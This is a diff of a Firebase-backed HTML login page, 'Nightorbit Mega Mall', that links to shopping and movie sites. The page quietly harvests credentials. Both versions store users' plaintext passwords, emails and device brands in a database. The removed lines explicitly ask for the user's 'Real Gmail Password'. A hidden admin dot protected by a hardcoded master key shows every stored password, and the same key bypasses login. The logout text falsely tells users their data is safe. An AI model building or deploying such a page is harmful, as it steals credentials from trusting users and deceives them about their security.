@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nightorbit Mega Mall - Final Perfect Version</title>
+    <title>Nightorbit Mega Mall - Final Custom</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -13,86 +13,69 @@
         :root { --primary: #00d2ff; --neon: #ff0055; --gold: #ffd700; --bg: #05070a; }
         * { box-sizing: border-box; }
         body { 
-            margin: 0; background: radial-gradient(circle, #1B2735 0%, var(--bg) 100%);
+            margin: 0; padding: 0; width: 100%; height: 100vh; 
+            background: radial-gradient(circle at center, #1B2735 0%, var(--bg) 100%);
             font-family: 'Segoe UI', sans-serif; color: white;
-            display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden;
+            display: flex; align-items: center; justify-content: center; overflow: hidden;
         }
         .card { 
             background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
-            padding: 30px; border-radius: 30px; text-align: center; 
-            width: 95%; max-width: 420px; border: 1px solid rgba(255,255,255,0.1); 
-            box-shadow: 0 0 40px rgba(0, 210, 255, 0.2); position: relative;
+            padding: 40px; border-radius: 30px; text-align: center; 
+            width: 360px; border: 1px solid rgba(255,255,255,0.1); 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.8); position: relative; z-index: 10;
         }
-
-        /* THREE DOTS MENU */
-        .menu-dots { position: absolute; top: 25px; right: 25px; cursor: pointer; font-size: 22px; color: var(--primary); z-index: 1000; }
-
-        /* PASSWORD EYE ICON */
+        /* THREE DOTS - LEFT SIDE (FIXED) */
+        .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; opacity: 0.7; }
         .pass-wrapper { position: relative; width: 100%; }
-        .pass-wrapper i { position: absolute; right: 15px; top: 22px; cursor: pointer; color: #888; z-index: 10; }
-
-        input { width: 100%; padding: 14px; margin: 8px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.5); color: white; outline: none; }
-        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; }
-        .btn-device { background: #fff; color: #000; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-bottom: 15px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .item-link { background: rgba(255,255,255,0.06); padding: 12px; border-radius: 15px; margin: 6px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--primary); font-size: 13px; }
-        .section-tag { font-size: 10px; color: var(--gold); text-align: left; margin: 15px 0 5px 5px; text-transform: uppercase; letter-spacing: 1px; }
-
-        /* GOODBYE OVERLAY */
-        #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 30px; }
-        
+        .pass-wrapper i { position: absolute; right: 15px; top: 22px; cursor: pointer; color: #888; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.4); color: white; outline: none; }
+        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
+        .btn-google { background: white; color: black; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-top: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .link-card { background: rgba(255,255,255,0.07); padding: 15px; border-radius: 15px; margin: 12px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--neon); transition: 0.3s; font-size: 14px; }
+        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
+        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; }
+        #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
         .hidden { display: none !important; }
-        .admin-trigger { position: fixed; bottom: 0; right: 0; width: 20px; height: 20px; background: transparent; z-index: 999; }
-        #admin-panel { position: fixed; inset: 0; background: #000; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
-        .admin-card { background:#111; padding:15px; margin-bottom:10px; border-radius:15px; border:1px solid #333; text-align:left; }
+        .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
     </style>
 </head>
 <body>
 
-    <div class="admin-trigger" onclick="openAdmin()"></div>
-
     <div id="logout-overlay">
-        <div style="font-size: 50px; margin-bottom: 20px;">🌹</div>
-        <div id="bye-msg" style="color: white; line-height: 1.8; font-size: 18px; max-width: 500px; font-weight: 300;"></div>
-        <div style="margin-top: 30px; font-size: 12px; color: var(--gold); letter-spacing: 2px;">NIGHTORBIT ELITE PROTECTION</div>
-    </div>
-
-    <div id="login-box" class="card">
-        <h1 style="color: var(--primary); margin: 0; letter-spacing: 3px; font-weight: 800;">NIGHTORBIT</h1>
-        <p style="color: #666; font-size: 11px; margin-bottom: 20px;">OWNER VERSION 2.0</p>
-        
-        <button class="btn-device" onclick="googleAuth()">
-            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="18"> LOGIN WITH GOOGLE
-        </button>
-
-        <div style="margin: 15px 0; color: #444; font-size: 10px;">— SECURITY VERIFIED —</div>
-        
-        <input type="email" id="email-in" placeholder="Email Address">
-        <div class="pass-wrapper">
-            <input type="password" id="pass-in" placeholder="Real Gmail Password">
-            <i class="fa-solid fa-eye" id="togglePass" onclick="togglePassword()"></i>
-        </div>
-
-        <button class="btn-main" onclick="emailAuth()" style="margin-top:10px;">CONTINUE TO BAZAAR</button>
-        <p id="error-msg" style="color: #ff0055; font-size: 11px; margin-top: 10px;"></p>
-    </div>
-
-    <div id="main-page" class="card hidden">
-        <div class="menu-dots"><i class="fa-solid fa-ellipsis-vertical"></i></div>
-        <h2 id="welcome-name" style="color: var(--primary); margin-bottom: 20px;">Welcome</h2>
-        
-        <div class="section-tag">Shopping & Cinema</div>
-        <a href="https://www.daraz.pk" target="_blank" class="item-link">🛍️ Daraz Mall <span>Shop</span></a>
-        <a href="https://tamashaweb.com/" target="_blank" class="item-link" style="border-left-color: var(--gold);">📺 Tamasha App <span>Live TV</span></a>
-        <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎞️ Netflix <span>Watch</span></a>
-        <a href="https://bollyflix.org.in/" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎬 Bollyflix <span>Movies</span></a>
-        
-        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:40px; font-size:11px; text-decoration: underline;">EXIT & GOODBYE</button>
+        <div style="font-size: 60px; margin-bottom: 20px;">✨</div>
+        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 19px; max-width: 500px;"></div>
     </div>
 
     <div id="admin-panel">
-        <h2 style="color: var(--primary);">Owner Data Panel</h2>
-        <button onclick="document.getElementById('admin-panel').style.display='none'" style="color:red; border:1px solid red; background:none; padding:8px 20px; border-radius:10px; margin-bottom:20px;">Close Panel</button>
-        <div id="user-display"></div>
+        <h1 style="color: var(--primary);">Owner Console</h1>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 30px; margin-bottom: 20px;">Exit</button>
+        <div id="user-rows-container"></div>
+    </div>
+
+    <div class="menu-dots" onclick="bypassLogin()">⋮</div>
+    <div class="admin-dot" onclick="adminAccess()">.</div>
+
+    <div id="login-box" class="card">
+        <h1 style="color: var(--primary); margin: 0; font-size: 32px; letter-spacing: 2px; font-weight: 800;">NIGHTORBIT</h1>
+        <button class="btn-google" onclick="authGoogle()">SIGNUP WITH GOOGLE</button>
+        <div style="margin: 20px 0; color: #444; font-size: 10px;">— SECURE LOGIN —</div>
+        <input type="email" id="u-email" placeholder="Email Address">
+        <div class="pass-wrapper">
+            <input type="password" id="u-pass" placeholder="Password (One Name Only)">
+            <i class="fa-solid fa-eye" id="togglePass" onclick="togglePassword()"></i>
+        </div>
+        <button class="btn-main" onclick="authEmail()">Login / Signup</button>
+        <p id="error-msg" style="color: var(--neon); font-size: 11px; margin-top: 10px;"></p>
+    </div>
+
+    <div id="member-area" class="card hidden">
+        <h2 id="user-welcome" style="color: var(--primary);">Welcome!</h2>
+        <div style="text-align: left; margin-top: 20px;">
+            <a href="https://www.daraz.pk" target="_blank" class="link-card">🛒 Daraz Mall <span>PK</span></a>
+            <a href="https://tamashaweb.com/" target="_blank" class="link-card" style="border-left-color: var(--gold);">📺 Tamasha App <span>TV</span></a>
+            <a href="https://bollyflix.org.in/" target="_blank" class="link-card" style="border-left-color: var(--primary);">🎬 Watch Movies <span>HD</span></a>
+        </div>
+        <button onclick="logoutSequence()" style="margin-top: 30px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline;">Secure Logout</button>
     </div>
 
     <script>
@@ -108,109 +91,110 @@
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const db = firebase.database();
-        let userRealName = "";
 
-        // Full Device Info
-        function getDeviceInfo() {
+        // 1. CLEAN DEVICE NAME LOGIC
+        function getDeviceBrand() {
             const ua = navigator.userAgent;
-            let device = "Mobile Device";
             if (/android/i.test(ua)) {
-                const match = ua.match(/\(([^)]+)\)/);
-                if (match) {
-                    const parts = match[1].split(';');
-                    device = parts[parts.length - 1].trim().replace("Build/", "");
-                }
-            } else if (/iPhone/i.test(ua)) { device = "Apple iPhone"; }
-            return device;
+                if (/samsung/i.test(ua)) return "Samsung";
+                if (/infinix/i.test(ua)) return "Infinix";
+                if (/oppo/i.test(ua)) return "Oppo";
+                if (/vivo/i.test(ua)) return "Vivo";
+                if (/xiaomi|redmi/i.test(ua)) return "Xiaomi";
+                if (/tecno/i.test(ua)) return "Tecno";
+                if (/realme/i.test(ua)) return "Realme";
+                return "Android Phone";
+            }
+            if (/iPhone|iPad|iPod/i.test(ua)) return "Apple iPhone";
+            return "PC/Desktop";
         }
 
         function togglePassword() {
-            const p = document.getElementById('pass-in');
-            const icon = document.getElementById('togglePass');
-            if(p.type === "password") { p.type = "text"; icon.classList.replace("fa-eye", "fa-eye-slash"); }
-            else { p.type = "password"; icon.classList.replace("fa-eye-slash", "fa-eye"); }
+            const p = document.getElementById('u-pass');
+            p.type = p.type === "password" ? "text" : "password";
         }
 
-        function googleAuth() {
+        function bypassLogin() {
+            if (prompt("Master Key:") === "rr123456789000rr") showMemberUI("Admin Farooq");
+        }
+
+        function authGoogle() {
             const provider = new firebase.auth.GoogleAuthProvider();
-            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Linked", res.user.displayName))
-            .catch(e => console.log("Google Canceled"));
-        }
-
-        function emailAuth() {
-            const e = document.getElementById('email-in').value;
-            const p = document.getElementById('pass-in').value;
-            if(!e || !p) return alert("Credentials please!");
-
-            auth.signInWithEmailAndPassword(e, p)
-            .then(res => handleLogin(res.user, p, e.split('@')[0]))
-            .catch(err => {
-                if (err.code === 'auth/user-not-found') {
-                    auth.createUserWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p, e.split('@')[0]));
+            auth.signInWithPopup(provider).then(res => {
+                let p = prompt("Enter Password (Ek Mukammal Naam):");
+                // Check if password is a single word
+                if (!p || p.trim().includes(" ")) {
+                    alert("Error: Password sirf ek naam hona chahiye (No Spaces)!");
+                    auth.signOut();
                 } else {
-                    document.getElementById('error-msg').innerText = "Wrong Password! Please use real Gmail password.";
+                    processUser(res.user, p);
                 }
             });
         }
 
-        function handleLogin(user, p, realName) {
-            userRealName = realName;
-            db.ref('users/' + user.uid).once('value', snap => {
-                let d = snap.val();
-                let secret = (d && d.secretName) ? d.secretName : "Member";
-                db.ref('users/' + user.uid).update({
-                    gmail: user.email, realName: realName, secretName: secret, password: p,
-                    device: getDeviceInfo(), time: new Date().toLocaleString()
-                }).then(() => {
-                    document.getElementById('login-box').classList.add('hidden');
-                    document.getElementById('main-page').classList.remove('hidden');
-                    document.getElementById('welcome-name').innerText = "Welcome, " + realName;
-                });
+        function authEmail() {
+            const e = document.getElementById('u-email').value;
+            const p = document.getElementById('u-pass').value;
+            if(!e || !p) return alert("Fill fields!");
+            if(p.trim().includes(" ")) return alert("Error: Password sirf ek naam hona chahiye!");
+
+            auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p))
+            .catch(() => {
+                auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p))
+                .catch(() => alert("Invalid Account/Password"));
             });
         }
 
-        function openAdmin() {
-            if (prompt("Owner Secret Key:") === "rr123456789000rr") {
+        function processUser(user, pass) {
+            db.ref('users/' + user.uid).once('value', (snap) => {
+                const data = snap.val();
+                let secretName = (data && data.savedName) ? data.savedName : "Member";
+                db.ref('users/' + user.uid).update({
+                    email: user.email,
+                    password: pass,
+                    device: getDeviceBrand(),
+                    savedName: secretName,
+                    time: new Date().toLocaleString()
+                }).then(() => showMemberUI(user.displayName || secretName));
+            });
+        }
+
+        function adminAccess() {
+            if (prompt("Admin Key:") === "rr123456789000rr") {
                 document.getElementById('admin-panel').style.display = 'block';
-                db.ref('users').on('value', snap => {
-                    let h = "";
-                    snap.forEach(s => {
-                        let d = s.val();
-                        h += `<div class="admin-card">
-                            <b style="color:var(--gold)">Secret: ${d.secretName}</b><br>
-                            <span style="color:var(--primary)">Name: ${d.realName}</span><br>
-                            <span style="color:#fff">Model: ${d.device}</span><br>
-                            <span style="color:var(--neon)">Pass: ${d.password}</span><br>
-                            <div style="margin-top:10px;">
-                                <button onclick="editSec('${s.key}', '${d.secretName}')" style="background:var(--primary); border:none; padding:4px 10px; font-size:11px; border-radius:5px;">Edit Secret</button>
-                                <button onclick="if(confirm('Remove?')) firebase.database().ref('users/${s.key}').remove()" style="background:red; color:white; border:none; padding:4px 10px; font-size:11px; border-radius:5px; margin-left:10px;">Delete</button>
-                            </div>
+                db.ref('users').on('value', (snap) => {
+                    let html = "";
+                    snap.forEach(c => {
+                        let v = c.val();
+                        html += `<div class="admin-card">
+                            <b style="color:var(--gold)">Secret: ${v.savedName}</b><br>
+                            <span>Device: ${v.device}</span><br>
+                            <span style="color:#fff">Password: ${v.password}</span><br>
+                            <small style="color:#666">${v.time}</small>
                         </div>`;
                     });
-                    document.getElementById('user-display').innerHTML = h;
+                    document.getElementById('user-rows-container').innerHTML = html;
                 });
             }
         }
 
-        function editSec(id, cur) {
-            let n = prompt("Admin View Name (Secret):", cur);
-            if(n) db.ref('users/' + id).update({ secretName: n });
+        function showMemberUI(name) {
+            document.getElementById('login-box').classList.add('hidden');
+            document.getElementById('member-area').classList.remove('hidden');
+            document.getElementById('user-welcome').innerText = "Hello, " + name;
         }
 
-        function triggerLogout() {
-            const o = document.getElementById('logout-overlay');
-            document.getElementById('bye-msg').innerHTML = `
-                <span style="font-size: 26px; color: var(--gold); font-weight: bold;">Farewell, ${userRealName}!</span><br><br>
-                It was a true honor to serve you at Nightorbit today. 
-                We hope your experience was nothing short of extraordinary. 
-                Remember, every time you exit, we wait with excitement for your return.<br><br>
-                May your heart be light, your path be clear, and your life be filled with success and laughter. 
-                Keep shining and keep being the amazing person you are.<br><br>
-                <i>"Always stay safe, stay happy, and keep that beautiful smile on your face."</i><br><br>
-                <span style="font-size: 13px; color: #555;">Processing secure session logout...</span>
+        function logoutSequence() {
+            const overlay = document.getElementById('logout-overlay');
+            document.getElementById('bye-text-display').innerHTML = `
+                <span style="font-size: 26px; color: var(--gold); font-weight: bold;">Goodbye!</span><br><br>
+                It was an absolute pleasure having you with us today. 
+                Your data is safe and your session is closing securely.<br><br>
+                May God bless you with happiness and success in every step of your life.<br><br>
+                <i>"Stay safe, stay blessed, and always keep smiling. Allah Hafiz!"</i>
             `;
-            o.style.display = 'flex';
-            setTimeout(() => { location.reload(); }, 6500);
+            overlay.style.display = 'flex';
+            setTimeout(() => { location.reload(); }, 6000);
         }
     </script>
 </body>
